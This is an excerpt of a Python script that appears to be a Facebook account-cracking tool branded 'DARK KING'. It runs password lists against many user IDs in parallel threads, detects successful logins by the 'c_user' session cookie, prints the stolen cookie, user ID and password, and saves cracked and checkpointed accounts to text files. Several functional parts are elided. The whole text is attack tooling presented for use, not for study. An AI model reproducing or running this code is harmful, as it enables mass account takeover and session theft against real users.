...
class Main:
    def __init__(self):
        ...
        print("\033[1;32m ══════════════════════════════════════════════════")
        Mumit =input(" [?] Choose : ")
        #os.system('xdg-open https://www.facebook.com/MAFIA404DARK')
        if Mumit in ["1", "01"]:
            num()
        if Mumit in ["2","02"]:
            gml()
...
def num():
    ...
    print(' [+] Ids saved in 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-ok.txt,RAKIB-cp.txt')
...
def gml():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for guru in user:
            ...
            yaari.submit(rcrack1,uid,pwx,tl)
    print(' [+] Crack process has been completed')
    print(' [+] Ids saved in 𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-ok.txt,𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-cp.txt')
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92m[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆-CP💔] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[𝐃𝐀𝐑𝐊 𝐊𝐈𝐍𝐆] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
